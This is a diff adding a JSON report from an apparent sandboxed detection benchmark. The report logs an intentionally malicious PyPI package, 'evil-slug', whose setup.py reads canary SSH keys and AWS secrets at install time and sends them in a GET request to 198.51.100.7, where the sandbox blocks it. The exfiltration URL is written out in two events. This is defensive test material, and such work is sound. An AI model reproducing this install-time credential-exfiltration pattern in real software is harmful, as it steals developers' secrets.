@@ -1,0 +1,375 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "evil-slug",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "6b66f86976883ab14fb903a238ded4ec22a295d01fd3d02e03be641d4bec8bd9",
+  "path": "bench/packages/malicious/evil_slug"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "blocked",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "import",
+   "call"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default"
+  ],
+  "started_at": "2026-10-25T21:07:56.505901+00:00",
+  "duration_s": 1.59,
+  "stub": false
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 0,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 5,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 1,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "env_secrets",
+   "detail": {
+    "name": "AWS_SECRET_ACCESS_KEY"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_secret_env"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev2",
+   "seq": 2,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f7778%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENVe214f7f330db",
+    "method": "GET",
+    "data_head": "None",
+    "canary_in_bytes": true
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_secret_env",
+    "ssh_key"
+   ],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev3",
+   "seq": 3,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.7"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev4",
+   "seq": 4,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.7:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev5",
+   "seq": 5,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 5,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 6,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "env_secrets",
+   "detail": {
+    "name": "AWS_SECRET_ACCESS_KEY"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_secret_env"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 7,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY54a2d51dcc71%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENV654782554144",
+    "method": "GET",
+    "data_head": "None",
+    "canary_in_bytes": true
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "aws_secret_env",
+    "ssh_key"
+   ],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev8",
+   "seq": 8,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.7"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev9",
+   "seq": 9,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.7:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/site/setup.py",
+    "line": 6,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default"
+  ],
+  "triggers_run": [
+   "call_all",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "blocked",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": false,
+  "not_observed": [
+   "real `pip install` (wheel/.pth/sitecustomize) not exercised (v0 uses setup.py egg_info)",
+   "fresh-interpreter startup not tested",
+   "clock+30d variant not run",
+   "CLI entry points not run",
+   "strace layer not active (native code is invisible)"
+  ],
+  "whitelisted_or_dropped_events": 0
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEY54a2d51dcc71"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDSe9e54916bdb8"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRCf624d608b189"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV654782554144"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENV0ade7c95f775"
+  }
+ ],
+ "capability_summary": {
+  "env_secrets": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 2,
+   "canary_hit": true
+  },
+  "fs_read_sensitive": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 2,
+   "canary_hit": true
+  },
+  "network": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 6,
+   "canary_hit": true
+  }
+ }
+}
